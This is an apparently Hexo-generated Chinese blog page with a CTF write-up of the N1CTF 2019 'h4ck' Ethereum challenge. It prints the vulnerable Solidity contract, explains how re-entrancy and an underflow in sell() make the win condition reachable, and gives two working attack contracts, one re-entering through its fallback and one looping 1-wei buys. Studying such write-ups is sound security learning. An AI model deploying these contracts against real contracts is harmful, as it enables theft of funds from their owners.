@@ -1,0 +1,504 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>Re-Entrancy(2)-N1CTF2019_h4ck - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Re-Entrancy(2)-N1CTF2019_h4ck">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-09-08 12:46" pubdate>
+        2022年9月8日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Re-Entrancy(2)-N1CTF2019_h4ck</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Re-Entrancy-2"><a href="#Re-Entrancy-2" class="headerlink" title="Re-Entrancy(2)"></a>Re-Entrancy(2)</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/#2019">wiki部分</a></p>
+<p>什么是重入攻击</p>
+<blockquote>
+<p>假设有两个合约A和合约B，合约A调用合约B。在这种攻击中，当第一个调用仍在执行时，合约B调用合约A，这在某种程度上导致了一个循环。</p>
+</blockquote>
+<p>每当我们将以太坊发送到智能合约地址时，我们都会调用我们所说的fallback函数。</p>
+<p><a target="_blank" rel="noopener" href="https://hitcxy.com/2019/h4ck/">wp</a></p>
+<h2 id="N1CTF-2019-h4ck"><a href="#N1CTF-2019-h4ck" class="headerlink" title="N1CTF 2019 h4ck"></a>N1CTF 2019 h4ck</h2><p>题目合约0xB616eBC25E1E9Cfbf6C82Ab66888926bfB0101a6<br>攻击合约0x8Ebd3958CeA078271cce190b6be6e2d73c37a1A2<br>源码</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">pragma solidity ^<span class="hljs-number">0.4</span>.<span class="hljs-number">25</span>;<br><br>contract owned &#123;<br>    address public owner;<br><br>    constructor <span class="hljs-literal">()</span> <br>        public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyOwner &#123;<br>        require(msg.sender<span class="hljs-operator"> == </span>owner);<br>        _;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer<span class="hljs-constructor">Ownership(<span class="hljs-params">address</span> <span class="hljs-params">newOwner</span>)</span> public <br>        onlyOwner &#123;<br>        owner = newOwner;<br>    &#125;<br>&#125;<br><br>contract challenge is owned&#123;<br>    <br>    <span class="hljs-built_in">string</span> public name;<br>    <span class="hljs-built_in">string</span> public symbol;<br>    uint8 public decimals = <span class="hljs-number">18</span>;<br>    uint256 public totalSupply;<br><br>    mapping (address =&gt; uint256) public balanceOf;<br>    mapping (address =&gt; uint256) public sellTimes;<br>    mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;<br>    mapping (address =&gt; <span class="hljs-built_in">bool</span>) public winner;<br><br>    event <span class="hljs-constructor">Transfer(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">address</span> <span class="hljs-params">_to</span>, <span class="hljs-params">uint256</span> <span class="hljs-params">_value</span>)</span>;<br>    event <span class="hljs-constructor">Burn(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">uint256</span> <span class="hljs-params">_value</span>)</span>;<br>    event <span class="hljs-constructor">Win(<span class="hljs-params">address</span> <span class="hljs-params">_address</span>,<span class="hljs-params">bool</span> <span class="hljs-params">_win</span>)</span>;<br><br><br>    constructor (<br>        uint256 initialSupply,<br>        <span class="hljs-built_in">string</span> tokenName,<br>        <span class="hljs-built_in">string</span> tokenSymbol<br>    ) public  &#123;<br>        totalSupply = initialSupply<span class="hljs-operator"> * </span><span class="hljs-number">10</span><span class="hljs-operator"> ** </span>uint256(decimals);  <br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> = totalSupply;                <br>        name = tokenName;                                   <br>        symbol = tokenSymbol;                               <br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-constructor">_transfer(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">address</span> <span class="hljs-params">_to</span>, <span class="hljs-params">uint</span> <span class="hljs-params">_value</span>)</span> internal &#123;<br>        require(_to != address(<span class="hljs-number">0x0</span>));<br>        require(_value &gt; <span class="hljs-number">0</span>);<br>        <br>        uint256 oldFromBalance = balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span>;<br>        uint256 oldToBalance = balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_to</span>]</span>;<br>        <br>        uint256 newFromBalance =  balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span> - _value;<br>        uint256 newToBalance =  balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_to</span>]</span> + _value;<br>        <br>        require(oldFromBalance &gt;= _value);<br>        require(newToBalance &gt; oldToBalance);<br>        <br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span> = newFromBalance;<br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_to</span>]</span> = newToBalance;<br>        <br>        <span class="hljs-keyword">assert</span>((oldFromBalance + oldToBalance)<span class="hljs-operator"> == </span>(newFromBalance + newToBalance));<br>        emit <span class="hljs-constructor">Transfer(<span class="hljs-params">_from</span>, <span class="hljs-params">_to</span>, <span class="hljs-params">_value</span>)</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer(address _to, uint256 _value) public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>, <span class="hljs-params">_to</span>, <span class="hljs-params">_value</span>)</span>; <br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> transfer<span class="hljs-constructor">From(<span class="hljs-params">address</span> <span class="hljs-params">_from</span>, <span class="hljs-params">address</span> <span class="hljs-params">_to</span>, <span class="hljs-params">uint256</span> <span class="hljs-params">_value</span>)</span> public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        require(_value &lt;= allowance<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span><span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span>);    <br>        allowance<span class="hljs-literal">[<span class="hljs-identifier">_from</span>]</span><span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> -= _value;<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">_from</span>, <span class="hljs-params">_to</span>, <span class="hljs-params">_value</span>)</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> approve(address _spender, uint256 _value) public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        allowance<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span><span class="hljs-literal">[<span class="hljs-identifier">_spender</span>]</span> = _value;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> burn(uint256 _value) public returns (<span class="hljs-built_in">bool</span> success) &#123;<br>        require(balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt;= _value);<br>        balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> -= _value;<br>        totalSupply -= _value;          <br>        emit <span class="hljs-constructor">Burn(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>, <span class="hljs-params">_value</span>)</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> balance<span class="hljs-constructor">Of(<span class="hljs-params">address</span> <span class="hljs-params">_address</span>)</span> public view returns (uint256 balance) &#123;<br>        return balanceOf<span class="hljs-literal">[<span class="hljs-identifier">_address</span>]</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> buy<span class="hljs-literal">()</span> payable public returns (<span class="hljs-built_in">bool</span> success)&#123;<br>        require(balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span>==<span class="hljs-number">0</span>);<br>        require(msg.value<span class="hljs-operator"> == </span><span class="hljs-number">1</span> wei);<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>, msg.sender, <span class="hljs-number">1</span>);<br>        sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> = <span class="hljs-number">1</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">function</span> sell(uint256 _amount) public returns (<span class="hljs-built_in">bool</span> success)&#123;<br>        require(_amount &gt;= <span class="hljs-number">100</span>);<br>        require(sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt; <span class="hljs-number">0</span>);<br>        require(balanceOf<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt;= _amount);<br>        require(address(this).balance &gt;= _amount);<br>        msg.sender.call.value(_amount)<span class="hljs-literal">()</span>;<br>        <span class="hljs-constructor">_transfer(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>, <span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>, _amount);<br>        sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> -= <span class="hljs-number">1</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> winner<span class="hljs-constructor">Submit()</span> public returns (<span class="hljs-built_in">bool</span> success)&#123;<br>        require(winner<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span><span class="hljs-operator"> == </span><span class="hljs-literal">false</span>);<br>        require(sellTimes<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> &gt; <span class="hljs-number">100</span>);<br>        winner<span class="hljs-literal">[<span class="hljs-identifier">msg</span>.<span class="hljs-identifier">sender</span>]</span> = <span class="hljs-literal">true</span>;<br>        emit <span class="hljs-constructor">Win(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>,<span class="hljs-params">true</span>)</span>;<br>        return <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> kill(address _address) public onlyOwner &#123;<br>        selfdestruct(_address);<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> eth<span class="hljs-constructor">_balance()</span> public view returns (uint256 ethBalance)&#123;<br>        return address(this).balance;<br>    &#125;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最终目的是调用到<code>winnerSubmit</code>函数，但它有两个<code>require</code>限制。第一个限制本来就是满足的，主要是第二个限制条件需要达到。</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">require</span>(winner[msg.sender] == <span class="hljs-literal">false</span>);<br><span class="hljs-built_in">require</span>(sellTimes[msg.sender] &gt; <span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure>
+
+<p>在<code>sell</code>和<code>buy</code>函数中都有对sellTimes增加的操作。<br><code>buy</code>函数中存在薅羊毛攻击，同时要求每次调用时传1 wei，然后让sellTimes[msg.sender] = 1。</p>
+<p><code>sell</code>函数中明显存在一个重入攻击，但有四个条件限制。限制了如下操作：</p>
+<ul>
+<li>限制了调用函数时参数amount&gt;=100</li>
+<li>sellTimes[msg.sender] &gt; 0 可以先调用buy即可</li>
+<li>这个限制可以先通过第三方攻击合约薅羊毛攻击然后调用transfer转账给攻击账户即可</li>
+<li>题目合约的balance本身就是很大的。</li>
+</ul>
+<p>达到条件后最后会进行sellTimes[msg.sender] -= 1;操作，这里很明显存在溢出，溢出之后就能达到winnerSubmit函数的第二个条件了。</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">require</span>(_amount &gt;= <span class="hljs-number">100</span>);<br><span class="hljs-built_in">require</span>(sellTimes[msg.sender] &gt; <span class="hljs-number">0</span>);<br><span class="hljs-built_in">require</span>(balanceOf[msg.sender] &gt;= _amount);<br><span class="hljs-built_in">require</span>(address(<span class="hljs-built_in">this</span>).balance &gt;= _amount);<br></code></pre></div></td></tr></table></figure>
+
+
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>部署攻击合约,攻击合约需要先调用一次<code>buy1</code></p>
+<figure class="highlight zephir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs zephir"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract exp &#123;<br>    <br>    address instance_address = <span class="hljs-number">0xB616eBC25E1E9Cfbf6C82Ab66888926bfB0101a6</span>;<br>    challenge target = challenge(instance_address);<br>    <span class="hljs-keyword">bool</span> status = <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">uint</span> have_withdraw = <span class="hljs-number">3</span>;<br>    constructor() payable &#123;<br>        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy1</span><span class="hljs-params">()</span></span>&#123;<br>        target.buy.value(<span class="hljs-number">1</span>)();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pay</span><span class="hljs-params">()</span> <span class="hljs-title">public</span> </span>&#123;<br>        <span class="hljs-comment">// withdraw</span><br>        <span class="hljs-keyword">if</span>(have_withdraw &gt;= <span class="hljs-number">0</span> )&#123;<br>            target.sell(<span class="hljs-keyword">uint</span>(<span class="hljs-number">100</span>));<br>            have_withdraw = have_withdraw <span class="hljs-number">-1</span> ;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span><span class="hljs-params">()</span></span>&#123;<br>        target.winnerSubmit();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> <span class="hljs-title">payable</span> </span>&#123;<br>        target.sell(<span class="hljs-keyword">uint</span>(<span class="hljs-number">100</span>));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>部署薅羊毛合约</p>
+<figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">// SPDX-License-Identifier: MIT<br><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.4</span>.<span class="hljs-number">24</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract Hunting &#123;<br>    address instance_address = <span class="hljs-number">0</span>xB616eBC25E1E9Cfbf6C82Ab66888926bfB0101a6;<br>    challenge target = challenge(instance_address);<br><br>    constructor() payable &#123;<br>        <br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title">buy1</span>()  payable&#123;<br>        target.buy.value(1)();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title">transfer1</span>()   &#123;<br>        target.transfer(address(0x8Ebd3958CeA078271cce190b6be6e2d73c37a1A2)  , 1);<br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title">Hunt</span>()    &#123;<br>        for ( int i = 0; i &lt; 100 ; i++)&#123;<br>            buy1();<br>            transfer1();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title">get</span>() public view returns (uint256 balance) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">address(this).balance</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>() public view returns (uint256 balance) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">target.balanceOf(address(this))</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>调用hunt函数，调用三次能让balance+300以便重入攻击的次数足够让sellTimes溢出<br><img src="http://39.107.239.30:3000/uploads/98ceb8ce-add9-4025-b0d1-540cc8ae742b.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时攻击合约的balance应该是301.<br><img src="http://39.107.239.30:3000/uploads/4c5af759-0291-4b7f-85fd-186b13f805ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后调用攻击合约的pay函数继续重入攻击，可以看到此时已经溢出<br><img src="http://39.107.239.30:3000/uploads/f8906dbb-aeee-4e07-aa9b-6201abc962dc.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后调用getflag即可，查看题目合约的events即可看到调用成功。<br><img src="http://39.107.239.30:3000/uploads/13d3214d-9c2d-4ec7-8177-31c05c54553a.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在看这题的时候，题目的逻辑捋的比以前更快了，不过这题的逻辑确实也比较简单，有几个函数都用不上，思路也比较清晰。以后得多用本地调试，真的很好用，除了第一次调试的时候看着一堆opcode头皮发麻，但后面对着opcode表调试勉强能看懂了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blockchain/">blockchain</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/06/2022-9-6-Re-Entrancy(1)/">
+                        <span class="hidden-mobile">Re-Entrancy(1)-QWB2019_babybank</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
